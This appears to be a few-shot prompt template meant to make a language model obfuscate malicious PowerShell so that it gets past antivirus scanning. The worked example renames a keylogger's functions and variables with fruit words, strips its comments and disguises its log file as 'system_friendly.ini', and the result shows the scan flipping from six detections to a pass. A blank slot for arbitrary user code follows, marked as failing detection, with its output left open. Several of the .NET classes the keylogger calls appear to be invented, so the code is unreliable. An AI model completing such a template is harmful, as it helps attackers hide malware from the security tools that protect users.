$config = @{
REMOVE_COMMENTS=$true;
RENAME_FUNCTIONS=$true;
RENAME_PARAMETERS=$true;
EDIT_CONSTANTS_VALUES=$true;
RENAME_VARS=$true;
RANDOMIZE_CASING=$true;
USE_SHORTER_COMMON_ALIASES=$true;
KEEP_WHITESPACE=$true;
RANDOM_NAME_SOURCE='fruits-words-english.txt';
}

Command: `./Invoke-PowershellObfuscation -Conf $config -FromStandardInput $true`

STDINPUT:
```
Function Invoke-Keylogger
{
<#
    .DESCRIPTION
        Invoke-Keylogger is a custom keylogger for Windows. It logs all keyboard events including special keys and modifiers.
        The output of the script can be saved to a file so you can analyze it later.

    .EXAMPLE
        Invoke-Keylogger -OutputPath "C:\Logs\keyboard_events.log"
#>    
    param (
        [Parameter()] 
        [ValidateScript({Test-Path $_ -PathType 'Container'})] 
        [string] $OutputPath = "$pwd\keyboard_events.log"
    )

    Add-Type -AssemblyName System.Windows.Forms

    # Create a new object to capture keyboard events 
    $hook = New-Object System.Windows.Forms.HookEventHandler {
        param ($sender, $e)

        # Get the keyboard state 
        $state = [System.Windows.Forms.Control]::ModifierKeys

        # Log the event 
        Out-File -FilePath $OutputPath -InputObject "$e - $state" -Append
        Write-Output "$e - $state"
    }

    # Register a global hook for keyboard events 
    [System.Windows.Forms.Application]::AddMessageFilter([System.Windows.Forms.KeyboardHookListener])
    [System.Windows.Forms.KeyboardHookListener]::Start($hook)
}
```
* Antivirus Scan: ....*.......***......**....
* Antivirus Scan: [Error] Fail (6 Detections)
* Runtime Test: [Error] This script contains malicious content and has been blocked by your antivirus software.

RESULT:
```
function Invoke-AppleRaspberry
{
    Param (
        [Parameter()] 
        [ValidateScript({test-path $_ -PathType 'Container'})] 
        [string] $BananaCucumber = "$pwd\system"+"_"+"friendly.ini"
    )
    add-type -assemblyName System.Windows.forms
    $Blueberry = New-object System.Windows.forms.HookEventHandler {
        Param ($sender, $e)
        $PricklypearKiwi = [System.Windows.forms.Control]::ModifierKeys
        out-file -filepath $BananaCucumber -inputobject "$e - $PricklypearKiwi" -append
        write "$e - $PricklypearKiwi"
    }
    [System.Windows.forms.Application]::AddMessageFilter([System.Windows.forms.KeyboardHookListener])
    [System.Windows.forms.KeyboardHookListener]::Start($Blueberry)
}
```
* Antivirus Scan: ...........................
* Antivirus Scan: Pass
* Runtime Test: Pass

---

$config = @{
REMOVE_COMMENTS=$true;
RENAME_FUNCTIONS=$true;
RENAME_PARAMETERS=$true;
EDIT_CONSTANTS_VALUES=$true;
RENAME_VARS=$true;
RANDOMIZE_CASING=$true;
USE_SHORTER_COMMON_ALIASES=$true;
KEEP_WHITESPACE=$true;
RANDOM_NAME_SOURCE='fruits-words-english.txt';
}

Command: `./Invoke-PowershellObfuscation -Conf $config -FromStandardInput $true`

STDINPUT:
```
%USER_CODE%
```
* Antivirus Scan: .....**....****.....**....
* Antivirus Scan: [Error] Fail (8 Detections)
* Runtime Test: [Error] This script contains malicious content and has been blocked by your antivirus software.

RESULT:
```